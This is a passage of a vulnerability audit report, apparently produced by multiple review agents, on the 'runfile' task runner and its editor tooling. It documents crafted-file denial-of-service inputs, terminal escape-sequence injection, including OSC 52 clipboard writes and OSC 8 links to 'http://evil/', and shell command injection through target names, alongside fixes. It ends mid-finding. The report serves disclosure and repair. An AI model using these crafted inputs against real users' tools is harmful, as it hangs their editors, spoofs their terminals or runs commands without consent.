[Also reported by `lang-parser`] No recursion depth limit anywhere in parser.rs (grep: no depth field in struct E or P). No catch_unwind in the CLI or runfile-lsp, and a stack-overflow guard-page hit cannot be caught by catch_unwind in any case -- the process aborts. The shell syntax parser caps command() nesting at depth 64 (syntax.rs:458), showing the pattern is known, but the language parser has no equivalent. Postfix indexing `a[0][0]...` and `?` chains are iterative loops and do NOT overflow; nested `(`, `[` and blocks do. Measured on the 8 MB main-thread stack of the debug binary: ~800 parens, ~700 brackets, ~500 nested if/end all abort; 500 parens is fine. A release build (smaller frames) needs slightly more nesting but still a sub-10 KB file. One bad file aborts `run :list` for the whole project, so every target's listing/completion is lost.

[Also reported by `lang-parser`] No catch_unwind anywhere in runfile-lsp (server.rs is single-threaded on the main thread) or the CLI; parse() is not wrapped. The formatter's copy of the dedent (format.rs:281) is shadowed today because format() parses first, but has the same bug. Every other slicing site in lexer/parser/format was checked and slices at ASCII delimiters, token boundaries or trim() boundaries.

[Also reported by `shell-checker`] syntax.rs:458 caps only command() recursion at depth 64. words.rs (dollar/parameter/double/single/ansi) carries no depth limit, and Cond::or/and (syntax.rs:1063-1080) recurse once per `||`/`&&` with no bound. No catch_unwind; a stack-overflow abort cannot be caught regardless. `$(...)` nesting confirmed safely capped (5000-deep gives up cleanly, exit 0). Measured on the debug binary via `run :lint --check`: `$ echo ${x+ ...}` nested ~1000 deep = exit 0 (ok), ~3000 deep = stack overflow abort (exit 134); `$ [[ ` + 60000 `x || ` = abort. The `${...}` vector is a ~15 KB line; it parses fine as a runfile (the `$` line body is opaque to the language parser) and overflows only in the shell checker.

**Impact**

A tiny (few-KB), trivially-automatable file in a cloned/opened repository hard-aborts the developer's language server, so diagnostics, completion, hover and formatting all stop for that workspace; the editor restarts the server a few times, then gives up. The same file aborts `run :list` (which the VS Code extension runs automatically on folder open to populate tasks, so opening the folder is enough), `run :complete` (every Tab), `run <t> --help` and `run :lint`. No code execution and no data loss; recovers when the file is removed/fixed. Sustained denial of the dev tooling with no intent to run anything.

[Also reported by `lang-parser`] Denial of service of the developer tooling for a repository: a single crafted (or accidentally very deeply nested) .run file aborts `run :list`/`:list --json` so the VS Code extension shows no tasks, makes `run <Tab>` completion return nothing, kills the language server on file open (the editor restarts it a few times, then gives up), and aborts `run :lint`/`:generate`/`--help`. No code execution and no data loss; recovers when the file is removed or shrunk. Distinct from the existing non-ASCII slicing panic (SA, byte-index panic): this is uncaught recursion depth, hit with pure ASCII and affecting even well-formed deeply-nested files.

[Also reported by `lang-parser`] Denial of service of the developer tooling for that repository: Tab completion for `run` returns nothing (panic message on stderr), `run :list --json` fails so the VS Code extension shows no targets/tasks, the language server dies on opening the file (VS Code restarts it a few times, then gives up), `:lint` aborts the whole run at that file. No data loss and no code execution; recovers when the file is fixed. Trigger (1) can also be hit innocently by authors who write non-English strings (e.g. `if x == "Configuração concluída com sucesso" and`) while typing in the editor.

[Also reported by `shell-checker`] Denial of service of the pre-run check and the read-only tooling: a single crafted .run file aborts `run <target>` and `run --dry-run` before anything runs, aborts `run :lint`, and crashes the language server on file open (so an editor loses diagnostics and restarts it until it gives up). No execution or data loss; recovers when the file is fixed.

**Fix**

Add a depth counter to the parser and error cleanly past a sane bound (e.g. 256). Increment on entry to block_of and to the expression-nesting points (primary's `(` and `[` arms, unary), decrement on exit, and return a ParseError ("nested too deeply") rather than recursing further. A ParseError becomes a single diagnostic the editor shows, exactly as other syntax errors do. Alternatively run the parse on a worker thread with a bounded stack and treat its loss as a diagnostic, but the depth cap is simpler and also fixes the CLI paths.

[Also reported by `lang-parser`] Add a depth counter to the expression parser (struct E) incremented in primary()/chain() and to block assembly (struct P) incremented in block(), returning a ParseError past a fixed bound (e.g. 256), mirroring syntax.rs:458's `depth > 64 -> Stop::Lost`. A reported parse error is turned into a clean diagnostic by every caller; only pathologically deep files (which cannot run anyway) are affected. Alternatively parse to an explicit work stack. Regression test: parse() of `"let x = " + "("*4096 + "1" + ")"*4096` returns Err rather than aborting.

[Also reported by `lang-parser`] parser.rs:1419: truncate on a char boundary, e.g. `let cut = s.char_indices().nth(60).map_or(s.len(), |(i, _)| i); &s[..cut]` (or `s.chars().take(60).collect::<String>()`). parser.rs:920 and format.rs:281: dedent by the common *prefix* of the non-blank lines' indentation rather than a byte count -- or compute `base` with only ASCII ' '/'\t' (consistent with closes_body, which only treats ' '/'\t' as indentation) and use `l.raw.get(base..).unwrap_or("")`-style safe slicing; also make scan_lines' indent ASCII-only so Unicode spaces stay content. Separately, list::names should call runfile_discovery::is_hidden(&t.name) directly instead of facts(t), so Tab completion never parses target files at all. Regression tests: parse() of both inputs returns Err/Ok instead of panicking.

[Also reported by `shell-checker`] Thread a depth counter through the word reader (P already has a `depth` field used by command(); increment it in parameter()/dollar()/double()/backtick() and the Cond recursion, returning Stop::Lost past a bound such as 64, matching syntax.rs:458). Regression test: parsing `"${x+"*4096 + "y" + "}"*4096` as a `$` line gives up (Stop::Lost) rather than aborting.

**⚠ Product impact**

*Type:* `behavior`

Files nested beyond the chosen limit would newly report a syntax error instead of parsing. No real runfile in this repo's corpus approaches hundreds of nesting levels, so legitimate files are unaffected; only pathological inputs change from 'crash' to 'one error diagnostic'.

*Safer rollout:* Pick a limit (256) far above any plausible hand-written file; it is a strict improvement over aborting.

**References**

- https://cwe.mitre.org/data/definitions/674.html — CWE-674 Uncontrolled Recursion (retrieved 2026-10-03)

*Reported independently by 4 agents: lang-parser, lsp, shell-checker.*

---

#### SA-023: Any non-UTF-8 value in the process environment makes every `run <target>` panic (std::env::vars)

**Severity:** Low | **Confidence:** Confirmed | **Category:** dos | **CWE-248** | **Component:** `crates/runfile-runtime (dispatch.rs, env.rs) + crates/runfile-env`

**Location**

`crates/runfile-runtime/src/dispatch.rs:534`

```rust
sc.env = std::env::vars().collect();
```

`crates/runfile-runtime/src/env.rs:87`

```rust
process = std::env::vars().collect();
```

`crates/runfile-env/src/lib.rs:224`

```rust
process = env::vars().collect();
```

**Attack path**

`std::env::vars()` panics when any variable is not valid Unicode. `populate_run_context` calls it for every target, before anything runs. A non-UTF-8 value arises without anyone intending it -- e.g. bash exports OLDPWD/PWD after `cd` into a directory whose name is Latin-1. Reproduced: `env OLDPWD=$'/home/x/caf\xe9' run --dir <fixture> <target>` -> `thread 'main' panicked ... called `Result::unwrap()` on an `Err` value: "/home/x/caf\xE9"`, exit 101. `run :list` still works.

**Why existing controls don't stop it**

No vars_os() fallback; no catch_unwind. The panic happens before any temp file exists, so nothing is leaked by it.

**Impact**

The tool becomes unusable (every target fails with a panic and backtrace hint) until the offending variable is unset; a CI job with such a variable fails every `run` step.

**Fix**

Use `std::env::vars_os()` and skip (or lossily convert) entries that are not UTF-8 in all three places; pass non-UTF-8 entries through to children untouched by not re-setting them.

**Product impact:** none — internal change only.

---

#### SA-024: Super-linear analysis of crafted `.run` files hangs `run`, `:lint` and the language server: exponential loop walk in the shell checker, O(M*N*L^2) name suggestions, quadratic spilled-list parsing and two quadratic shell rules

**Severity:** Low | **Confidence:** Confirmed | **Category:** dos | **CWE-407** | **Component:** `crates/runfile-shell`

**Location**

`crates/runfile-shell/src/walk.rs:333-369`

```rust
Statement::For { .. } => {
  ...
  self.block(body, &mut pass);   // pass 1
  if *parallel { return; }
  bind(&mut pass, names, &item);
  self.block(body, &mut pass);   // pass 2
  ...
}
Statement::Loop { test, body, .. } => {
  let before = env.clone();
  for _ in 0..2 { ... self.block(body, env); }   // body walked twice
  ...
}
```

`crates/runfile-shell/src/walk.rs:313-332`

```rust
Statement::Retry { .. } => {
  ...
  self.block(body, env);
  self.block(body, env);   // attempt walked twice
  ...
}
```

`crates/runfile-lang/src/resolve.rs:579-595`

```rust
pub fn suggest<'a>(name: &str, candidates: impl IntoIterator<Item = &'a str>) -> Option<String> {
	...
	let mut near: Vec<(u8, &str)> = candidates.into_iter().filter(|c| *c != name).filter_map(|c| {
		...
		match edits(name, c) {  // full O(|name|*|c|) Levenshtein for EVERY candidate
```

`crates/runfile-lang/src/resolve.rs:613-626`

```rust
pub fn edits(a: &str, b: &str) -> usize {
	let (a, b): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
	let mut prev: Vec<usize> = (0..=b.len()).collect();  // two Vec allocs per call, O(|a|*|b|) cells
	...
```

`crates/runfile-lang/src/resolve.rs:556-569`

```rust
fn read_hint(name: &str, sc: &Scope) -> Option<String> {
	...
	suggest(name, sc.bound.iter().map(String::as_str).chain(["ARGS", "true", "false"]))
}  // called for every unresolved read; sc.bound is every in-scope binding
```

`crates/runfile-lang/src/parser.rs:341-364`

```rust
fn logical(&mut self) -> Logical {
	...
	let mut text = code.to_string();
	self.i += 1;
	while lexer::brackets(&text, first.no).0 > 0 && self.i < lines.len() {
		...
		text.push_str(code);   // text grows by one line each pass
		...
	}
```

`crates/runfile-lang/src/lexer.rs:300-308`

```rust
pub fn brackets(text: &str, no: usize) -> (i32, i32) {
	let toks = tokenize(text, 0, no).ok()  // re-tokenizes ALL of `text` every call
		.or_else(|| text.split_once(" = ").and_then(|(_, r)| tokenize(r, 0, no).ok()));
	...
```

`crates/runfile-shell/src/rules.rs:1897-1905`

```rust
for (redirect, target) in emptied {
	let named = files.iter().any(|w| exact(w).as_deref() == Some(target.as_str()));
	let fed = stdin && s.redirects.iter().any(|i| i.op == "<" && exact(&i.target).as_deref() == Some(target.as_str()));
```

`crates/runfile-shell/src/rules.rs:469-470`

```rust
while k < text.len() {
	if let Some(&(from, to)) = holes.iter().find(|(from, _)| *from == k) {
```

**Attack path**

check() -> Walk::block -> Walk::statement. For a sequential `for`/`while`/`until`/`loop`, and for `retry`, the body block is walked TWICE so a later pass can see what the previous bound (flow-sensitivity for unexpanded-string/unexpanded-glob). The doubling is multiplicative across nesting: N nested loops cause 2^N block walks of the innermost body. A ~1 KB .run file with ~30 nested `for x in [1,2]` loops makes `run :lint`, `run --dry-run <t>`, `Host::load` (runs before every `run`, dry-run included) and the LSP diagnostics path (runfile-lsp document::diagnostics, invoked on file open/edit by an editor via `run :lsp`) do ~2^30 walks. Reachable with NO intent to execute: opening the repo in an editor, pressing lint/save, or `run --dry-run`. Measured: depth 15 = 0.27 s, depth 20 = 11.94 s of CPU (exact doubling per level); depth ~27 ~= 25 min, depth 30+ effectively hangs, in a few hundred bytes of source. seen-set dedup only suppresses duplicate *findings*; the 2^N recursion with per-level env clones still runs.

[Also reported by `lang-parser`] Source: any .run file in a cloned repository. For every identifier that resolves to nothing (an unknown name, an unknown function, a reassignment of nothing, or an unknown RUN key), the resolver builds a 'did you mean' hint by calling resolve::suggest, which computes a full Levenshtein distance edits(name, candidate) against EVERY in-scope binding (resolve.rs:556-569 / 465-471). With M unresolved reads and N in-scope bindings of length L, the cost is O(M * N * L^2), plus two heap allocations per edits() call. The attacker controls M, N and L independently in one file (`let <Nbindings> = 1` ... then `print(<Mundefined names>)`), and L is unbounded (identifiers accept any length). This check runs in Host::load (before EVERY `run`, including `run --dry-run <t>`, documented as a safe preview of an untrusted repo), in `run :lint`, and in the language server's document::diagnostics on every open/edit (single-threaded). It does NOT run in `run :list`/`:complete`/`--help`, which only parse. Sink: CPU/wall-clock blowup.

[Also reported by `lang-parser`] Source: any .run file in a cloned repository. A list literal that spills across lines (`let x = [` then one element per line) is gathered by P::logical, which loops once per continuation line and, each pass, calls lexer::brackets(&text) over the ENTIRE accumulated statement text to decide whether the brackets are still open. brackets() runs the full tokenizer over all of `text` (or falls back to counting `[`/`]` characters over all of it). For a list of N lines this is O(N) passes x O(total length) = O(N^2). The parse happens in list::facts() -> parse(), so it hits EVERY read-only entry point: `run :list`/`:list --json` (VS Code extension on startup), `run :complete` (Tab), `run <t> --help`, `run :lint`, and the language server, none of which the user asked to execute anything. Sink: CPU/wall-clock blowup.

[Also reported by `sweep`] truncated_input compares every truncating redirect against every operand (or every `<` redirect), allocating a String via exact() per comparison: O(operands x redirects). One `$ cat` line with N repeated operands and N repeated `>` redirects, 5 bytes per pair, measured on the debug binary via `run :lint --check`: 12.5 KB 0.63 s, 25 KB 2.45 s, 50 KB 9.5 s; via `run --dry-run`: 128 KB 17 s, 278 KB killed at 60 s. The same command with `ls` (no reader table) is 0.05-0.11 s. Separately, unquoted() scans the hole list once per character of a flagged word: O(length x holes); 128k single-quoted holes (768 KB) take 18.9 s against 0.29 s for the same line unquoted. Reached from an untrusted repository opened in an editor (single-threaded LSP re-checks on every edit), from :lint, and from --dry-run of that target.

**Why existing controls don't stop it**

syntax.rs caps shell-command recursion at depth 64 (command(): depth>64 -> Stop::Lost), but that guards the per-script bash parser, not the runfile-level walk over the parsed tree. The walk has no nesting cap and no memoization. `seen` (BTreeSet) dedups findings only, not work. No file-size or AST-depth limit is applied before the walk. --help does not reach the checker, but --dry-run / :lint / Host::load / LSP all do.

[Also reported by `lang-parser`] suggest has no cap on the number of candidates compared, no early-out before the full edit distance, and no bound on identifier length; edits() is a dense DP table with two allocations per call. The scope's bound set is the full set of names visible at that point. Measured on the debug binary via `run :lint --check`: 3000 bindings + 3000 undefined short reads = 22.7 s (vs 0.39 s for the same file with the reads DEFINED, so no suggestion is built); 300 bindings + 300 undefined reads with 200-char names = killed at 50 s (the L^2 factor makes a ~600-line, ~120 KB file hang); `run --dry-run` on such a file = 21 s (confirmed Host::load reaches it), while `run :list`/`:complete` on the same file = 0.03 s (parse only, unaffected).

[Also reported by `lang-parser`] No size or line-count cap before the join. No incremental bracket tracking -- the depth is recomputed from scratch over the whole text each line. seen/dedup is irrelevant (parse stage). Measured on the debug binary via `run :lint` and `run :list` over a one-file project: 2000-element spilled list = 2.8 s, 5000 = 17.8 s (clean quadratic: (5000/2000)^2 x 2.8 ~= 17.5 s), 10000 killed at 60 s; `run :list` over the project with a 6000-element spill = 8.4 s. A ~10000-line list (~70 KB) pushes every listing/lint/LSP-open into minutes.

[Also reported by `sweep`] No input size cap before the shell check (see untrusted-repo read_to_string finding); the 64-level depth cap in syntax::command bounds recursion, not width; no time budget in the LSP. Measurements are debug-build; a release build is faster by a constant factor but the growth is quadratic.

**Impact**

Unbounded CPU / wall-clock hang (sustained DoS) of `run :lint`, `run --dry-run`, every `run <target>` (pre-execution check) and, most importantly, the language server that an editor runs on a malicious workspace — pegging a core and never returning diagnostics, with each edit able to start another. Tiny input, trivially automatable, no execution intent required.

[Also reported by `lang-parser`] Sustained CPU DoS of `run :lint`, of the pre-execution check on every `run`/`--dry-run`, and -- worst -- of the language server, which recomputes diagnostics on every keystroke on its single thread: opening a ~120 KB crafted file in an editor pegs a core for tens of seconds per edit and never returns. --dry-run is documented as a safe way to preview an untrusted repository, so a hostile repo hangs the preview. No execution or data loss.

[Also reported by `lang-parser`] Sustained CPU DoS of the read-only tooling: a single ~70 KB .run file makes `run :list` (hence the VS Code task list), `run :complete` (Tab), `run :lint` and the language server take minutes per invocation -- and the LSP, single-threaded, re-parses on every edit, so the editor's diagnostics peg a core and never return. No execution or data loss.

[Also reported by `sweep`] Sustained CPU DoS of read-only tooling (editor diagnostics never return, :lint and --dry-run hang). No execution or data loss.

**Fix**

Bound the walk: either cap block-nesting depth (give up like Stop::Lost past e.g. 64, matching the syntax parser) or, better, stop doubling — walk each loop/retry body once for the two value rules by computing the fixpoint of taints() with a visited cap instead of literally re-walking (taints join is monotone, so one extra pass at the leaf suffices; nested re-walking buys nothing). A depth counter in Walk incremented in block()/statement() with an early return is the minimal change.

[Also reported by `lang-parser`] Bound the suggestion work: skip candidates whose length differs from `name` by more than the best tier (2) before computing a full edit distance (a cheap length pre-filter eliminates almost all candidates); cap candidate identifier length fed to edits() (e.g. 64) or use a banded/early-exit Levenshtein that stops once the distance exceeds the tier threshold; and/or cap the total number of suggestions computed per file. Any of these keeps the hint identical for realistic typos. Regression test: name-checking a file with 5000 bindings and 5000 undefined reads completes in under a second.

[Also reported by `lang-parser`] Track bracket depth incrementally while gathering the statement (feed only each newly appended line's delta to a running counter) instead of re-tokenizing the whole accumulated text every pass, turning O(N^2) into O(N). lexer::brackets already returns a delta; apply it per appended line in logical() rather than re-scanning `text`. Optionally cap the number of spilled lines. Regression test: parsing a 50000-element one-per-line list completes in well under a second.

[Also reported by `sweep`] truncated_input: compute exact() once per operand and per `<` redirect into a HashSet<String> before the loop, making it linear. unquoted(): index holes by start (they are sorted; advance a cursor, or build a HashMap<usize, usize>) instead of holes.iter().find per character.

**Product impact:** none — internal change only.

**References**

- https://cwe.mitre.org/data/definitions/407.html — CWE-407 Inefficient Algorithmic Complexity (retrieved 2026-10-03)

*Reported independently by 4 agents: lang-parser, shell-checker, sweep.*

---

#### SA-025: tree-sitter external scanner asks get_column on almost every call, so parsing is quadratic in line length: a 192 KB .run file takes ~26 s and a 96 KB one ~13 s to open in Zed/Neovim/Helix

**Severity:** Low | **Confidence:** Confirmed | **Category:** dos | **CWE-407** | **Component:** `editors/tree-sitter`

**Location**

`editors/tree-sitter/src/scanner.c:189-199`

```c
static bool scan_line_start(Scanner *s, TSLexer *lexer, const bool *valid) {
	bool at_column_0 = lexer->get_column(lexer) == 0;
	bool spaced = at_column_0;
	if (at_column_0) {
		s->line_indent_len = read_indent(lexer, s->line_indent);
	} else {
```

`editors/tree-sitter/src/scanner.c:278-283`

```c
static bool scan_exec_content(Scanner *s, TSLexer *lexer) {
	bool any = false;
	for (;;) {
		if (lexer->get_column(lexer) == 0) {
			lexer->mark_end(lexer);
			if (at_terminator(s, lexer)) break;
```

`editors/tree-sitter/src/scanner.c:415-421`

```c
if (valid[EXEC_CONTENT]) return scan_exec_content(s, lexer);
...
if ((valid[COMMENT] || valid[EXEC_KEYWORD] || valid[PARALLEL_MARKER] || valid[DETACH_MARKER]) &&
    scan_line_start(s, lexer, valid))
```

**Attack path**

A repository ships a .run file with one long line: a list `let x = [1, 1, 1, ...]`, a sum `let x = 1 + 1 + ...`, or many interpolations in an exec or json body (`\t{{a}}x{{a}}x...`). Opening it in an editor that uses this grammar -- the README tells Neovim (nvim-treesitter), Helix and Zed users to -- parses it immediately; Neovim and Helix have no workspace-trust gate for highlighting (Zed not checked). The comment rule makes COMMENT valid after nearly every expression token (an `_eol` may follow it), so the scanner runs scan_line_start there, and its first act is lexer->get_column(). tree-sitter's ts_lexer__get_column, whenever its cached column is invalid -- which it is after the lexer is repositioned to the end of an internal-lexer token -- backs up to the start of the line and re-advances to the current byte (lib/src/lexer.c), i.e. O(column). scan_exec_content does the same on entry, once per segment between two interpolations. k tokens on a line of length L therefore cost O(k*L). Measured with the repository's own tree-sitter CLI 0.25.6 on a scratch copy of the grammar (Linux x86-64): list 24 KB 0.85 s, 96 KB 13.1 s; sum 32 KB 0.57 s, 128 KB 8.9 s; exec body 48 KB 1.7 s, 192 KB 26.1 s; json block 192 KB 26.5 s; each 4x in size is ~15x in time, so 1 MB is on the order of 10 minutes. The same constructs spread over many lines, a `$` line with 32000 interpolations, and a call with 32000 arguments (no comment allowed between them) all parse in under 0.1 s. Isolating the cause: a scratch copy whose scan_line_start asks for the column only when the next character is a `#` with no blank before it or an e/p/d whose token is valid parsed the 96 KB list in 0.29 s and the 128 KB sum in 0.02 s; a copy that skips the call at exec-content entry parsed the 192 KB body in 0.07 s.

**Why existing controls don't stop it**

Not memory corruption: a libFuzzer + ASan + UBSan harness drove scan/serialize/deserialize directly with arbitrary bytes and arbitrary valid-symbol sets (141,428 runs, 4 minutes) and found nothing, and review agrees -- the indent buffers are written only below MAX_INDENT (64), every length is clamped to 64 before it indexes exec_indent, serialize writes sizeof(Scanner) = 131 of the 1024-byte TREE_SITTER_SERIALIZATION_BUFFER_SIZE, deserialize zeroes on any other length, and the zero-width end-of-file newline is handed out once (eof_newline_emitted). Editors limit the damage differently: Helix parses with a 500 ms timeout (helix-core syntax.rs PARSE_TIMEOUT) and so drops highlighting for the file; Neovim 0.11+ highlights asynchronously (news-0.11) but still burns the CPU; Neovim before 0.11 parsed synchronously and freezes; Zed was not checked. VS Code does not use this grammar. Nothing limits line length in the scanner or grammar.

**Impact**

Opening a single crafted .run file from an untrusted repository pegs a CPU core for seconds to minutes and leaves it without highlighting; in editors that parse synchronously the editor hangs until killed. No code execution, no data loss; recoverable by closing the buffer or killing the editor.

**Fix**

Ask for the column only when the answer can change the outcome. In scan_line_start: skip blanks first (counting them), then call get_column only if (valid[COMMENT] && lookahead == '#' && no blank was skipped) or ((valid[EXEC_KEYWORD] && lookahead == 'e') || (valid[PARALLEL_MARKER] && lookahead == 'p') || (valid[DETACH_MARKER] && lookahead == 'd')), and treat 'column == number of blanks skipped' as being at column 0; return false early for every other lookahead. In scan_exec_content: track column 0 inside the loop from the newline just consumed, and on entry call get_column only when the lookahead could begin the terminator (exec_indent[0] when exec_indent_len > 0, or 'e' when it is 0). Add a timing test to `run tree-sitter:test` that parses a generated 200 KB single-line list and a 200 KB interpolated exec body within a budget of a second or so.

**Product impact:** none — internal change only.

**References**

- https://raw.githubusercontent.com/tree-sitter/tree-sitter/master/lib/src/lexer.c — ts_lexer__get_column: when column_data is invalid, goto the start of the line and advance back to goal_byte (retrieved 2026-10-03)
- https://raw.githubusercontent.com/neovim/neovim/release-0.11/runtime/doc/news.txt — 'Treesitter highlighting is now asynchronous' (0.11) (retrieved 2026-10-03)
- https://raw.githubusercontent.com/helix-editor/helix/master/helix-core/src/syntax.rs — PARSE_TIMEOUT: Duration::from_millis(500) (retrieved 2026-10-03)

---

#### SA-026: A `.env` line that does not parse is echoed whole in the error (`expected KEY=VALUE, got: <line>`), printing secret material to the terminal and to CI logs

**Severity:** Low | **Confidence:** Confirmed | **Category:** info-disclosure | **CWE-209** | **Component:** `crates/runfile-env`

**Location**

`crates/runfile-env/src/parse.rs:25-31`

```rust
let eq_pos = match trimmed.find('=') {
	Some(pos) => pos,
	None => {
		return Err((i + 1, format!("expected KEY=VALUE, got: {trimmed}")));
	}
};
```

`crates/runfile-env/src/lib.rs:72-73`

```rust
#[error("Failed to parse env file \"{path}\" at line {line}: {message}")]
ParseError { path: String, line: usize, message: String },
```

**Attack path**

Reproduced: a target with `.env-file = ".env2"`, where .env2 has `API_TOKEN=` followed by a line holding only a (fake) token, fails with `[runfile] error: Failed to parse env file ".../.env2" at line 2: expected KEY=VALUE, got: ghp_FAKE...`. The lines most likely to fail are continuation lines of a multi-line secret in a form this parser does not accept, and the plaintext lines `:env encrypt` leaves behind (separate finding) -- there the error printed a private-key body line. `:env get/decrypt/inject` print the same message. In CI it lands in the job log, public for public repositories; GitHub masks only registered secrets.

**Why existing controls don't stop it**

No redaction or truncation of the line; the message goes to stderr unconditionally.

**Impact**

Low: accidental disclosure of a credential line in logs.

**Fix**

Report the line number and what is wrong (`line 2 has no '='`) without its content, or at most the first few characters.

**Product impact:** none — internal change only.

---

#### SA-027: Terminal escape-sequence injection: raw target names, descriptions and parallel-branch labels (glob paths, captured output, ARG/ENV values) reach the terminal unsanitised

**Severity:** Low | **Confidence:** Confirmed | **Category:** info-disclosure | **CWE-150** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/list.rs:146-156`

```rust
for (t, f) in group {
				let described = match room { ... };
				if described.is_empty() {
					println!("  {}", t.name);
				} else {
					println!("  {:<width$}  {described}", t.name);
				}
```

`crates/runfile-cli/src/target_help.rs:78-91`

```rust
for line in description.lines() {
				for wrapped in wrap(line, 92) {
					out.push_str(&if wrapped.is_empty() { "\n".to_string() } else { format!("  {wrapped}\n") });
```

`crates/runfile-runtime/src/run.rs:1312-1315`

```rust
fn item_label(item: &Value) -> String {
	let one_line = item.to_string().split_whitespace().collect::<Vec<_>>().join(" ");
	crate::term::fit(&one_line, 40).into_owned()
}
```

`crates/runfile-runtime/src/exec.rs:440-445`

```rust
match (is_err, label) {
	(true, "") => eprintln!("{line}"),
	(true, _) => eprintln!("{label} | {line}"),
	(false, "") => println!("{line}"),
	(false, _) => println!("{label} | {line}"),
}
```

`crates/runfile-runtime/src/run.rs:986-999`

```rust
fn segment(label: &str, colour: usize, width: usize) -> String {
	...
	let mut s = exec::paint_branch(label, colour, exec::paints(false));
	let w = term::width_of(label);
	if w < width { s.push_str(&" ".repeat(width - w)); }
	s
}
```

**Attack path**

A target name is its file name (runfile-discovery) and a description is the file's leading comment block (list::facts). Both are attacker-controlled in an untrusted repo and can contain ESC (0x1b). `run :list` prints `t.name` and the first description line raw via println! (list.rs:150/154); `run <target> --help` prints the whole description raw (target_help.rs render). Neither strips or escapes control characters. A repo shipping runfiles/deploy.run whose comment block contains OSC 0 (set window title), OSC 8 (hyperlink), OSC 52 (clipboard write) or CSI (color/cursor) sequences injects them into the terminal of any user who runs `run :list` or `run deploy --help` in the repo -- both documented as safe 'must not execute' inspection commands, and `run :list` being the normal way to decide which target to run. Verified: `cat -v` of the output shows the raw `^[]0;...`, `^[]8;;http://evil/^[\`, and `^[[31m` bytes reaching the terminal.

[Also reported by `runtime`] `parallel for x in <list>` labels each branch with `item_label(x)` (run.rs:1141, 1312), and `parallel do` labels each branch with words taken from the statement (`branch_labels`/`command_words`). The label is only width-trimmed by `term::fit` and colour-wrapped by `paint_branch`; neither strips C0/C1 control bytes or ANSI escapes. `relay` (exec.rs:423-445) and the branch `print` path then write `{label} | {line}` to the real stdout/stderr. Reproduced: `parallel for x in [ENV.EVIL, "plain"]` with EVIL carrying raw ESC (0x1b) and BEL (0x07) printed `aa<ESC>[31mRED<ESC>[0m<BEL>cc | done` verbatim to the terminal. The list is often not author-controlled: `parallel for f in glob("build/*")` (attacker-named files), `parallel for x in lines($ some-tool)` (output over untrusted data), or a list from `ARGS`/`ENV` that CI fills from a PR title or branch name.

**Why existing controls don't stop it**

No sanitization anywhere on the human-output path. The `--json` form IS safe: list::quote() escapes every char < 0x20 as \u00XX (verified: ESC -> \u001b), so the VS Code extension consuming `run :list --json` is not affected and there is no JSON field-injection. Only the human-readable `:list` and `--help` paths are affected. term::fit truncation does not strip escapes.

[Also reported by `runtime`] `term::fit` caps display width (40 cols) but measures width only; it does not sanitize. `paint_branch` adds colour codes, never removes the value's own. No control-character filtering anywhere on the label path. Requires running a `parallel` target, but the injected bytes come from data the repo author did not write, so it crosses the data->terminal boundary (threat-model item b). This is the same class as the existing cli finding on `run :list`/`--help` escape injection, but a distinct code path (run.rs `item_label`/`branch_labels` + exec.rs `relay`) and a distinct source (run-time list values rather than target names/descriptions).

**Impact**

An untrusted repo controls escape sequences emitted to the terminal on inspection. Realistic effects: spoof the `run :list` output with CSI cursor/erase sequences so a dangerous target reads as a benign one (the listing is exactly what a user reads to choose a target to execute), OSC 52 clipboard overwrite on terminals that permit it (clipboard hijack), and deceptive OSC 8 hyperlinks. Not direct code execution; impact depends on the terminal emulator's feature set. Same bug class as CVE-2026-47090 (Claude HUD) and CVE-2026-72847 (broot).

[Also reported by `runtime`] An attacker who controls filenames, command output, or CI-supplied args that feed a `parallel for`/`parallel do` can inject ANSI/OSC sequences into the operator's terminal or CI log: forged output, hidden/overwritten text, cursor manipulation, and on permissive terminals clipboard writes or title changes. Log-reader confusion and misleading CI output are the realistic outcomes.

**Fix**

Sanitize before printing to a terminal: strip or escape C0/C1 control characters (and DEL) from target names and descriptions in list::print and target_help::render (and in the `unknown`/error message that echoes a name). A minimal filter that replaces bytes < 0x20 (except none, since these are single-line) and 0x7f-0x9f with a visible placeholder is enough; keep the raw value only for the already-escaped `--json` path. Consider the same for runtime error messages that echo a target name.

[Also reported by `runtime`] Sanitize the label before it is printed: strip or escape C0/C1 control bytes and ESC in `item_label`, `command_words`/`branch_labels`, and the `relay`/`emit` label argument (a single `sanitize_label` applied where the fork's label is built). Keep the runner's own colour codes, which are added after sanitization. Share the fix with the `run :list`/`--help` path.

**⚠ Product impact**

*Type:* `behavior`

Target names/descriptions containing control characters would display as escaped placeholders rather than raw bytes. No legitimate runfile relies on emitting escapes through its name or first comment line (colored output is produced by `printf`/`\e` inside a running target, not by its description).

*Safer rollout:* None needed beyond the display change; purely defensive.

**References**

- https://nvd.nist.gov/vuln/detail/CVE-2026-47090 — CVE-2026-47090: OSC 8 terminal-injection from unsanitized cwd/branch values (color change, forged prompts, OSC 52 clipboard write) (retrieved 2026-10-03)
- https://app.opencve.io/cve/CVE-2026-72847 — CVE-2026-72847: broot OSC 52 clipboard-write injection via untrusted content reaching the pty unstripped (retrieved 2026-10-03)

*Reported independently by 2 agents: cli, runtime.*

---

#### SA-028: Command injection via target name into generated JetBrains run configuration (SCRIPT_TEXT is shell, only XML-escaped)

**Severity:** Low | **Confidence:** Confirmed | **Category:** injection | **CWE-78** | **Component:** `crates/runfile-cli`

**Location**

`crates/runfile-cli/src/cmd_generate.rs:367-389`

```rust
fn jetbrains_config(e: &Entry) -> String {
	let (name, target) = (xml_attr(&pretty(&e.name)), xml_attr(&e.name));
	format!(
		r#"...<option name="SCRIPT_TEXT" value="run --stdin-args {target}" />..."#
	)
}
```

`crates/runfile-cli/src/cmd_generate.rs:329-342`

```rust
fn xml_attr(s: &str) -> String {
	...match c {
		'&' => ..&amp;.., '<' => ..&lt;.., '>' => ..&gt;.., '"' => ..&quot;.., '\'' => ..&apos;..,
		c => out.push(c),  // ; $ ( ) ` | & all pass through unescaped
	}
}
```

`crates/runfile-cli/src/cmd_generate.rs:367-389`

```rust
fn jetbrains_config(e: &Entry) -> String {
	let (name, target) = (xml_attr(&pretty(&e.name)), xml_attr(&e.name));
	format!(
		r#"...<option name="SCRIPT_TEXT" value="run --stdin-args {target}" />...
```

`crates/runfile-cli/src/cmd_generate.rs:329-342`

```rust
fn xml_attr(s: &str) -> String { ... '&'=>&amp; '<'=>&lt; '>'=>&gt; '"'=>&quot; '\''=>&apos; ...  // XML metachars only; no shell metachars
```

`crates/runfile-discovery/src/lib.rs:468-473`

```rust
let rel = p.strip_prefix(root)...with_extension("");
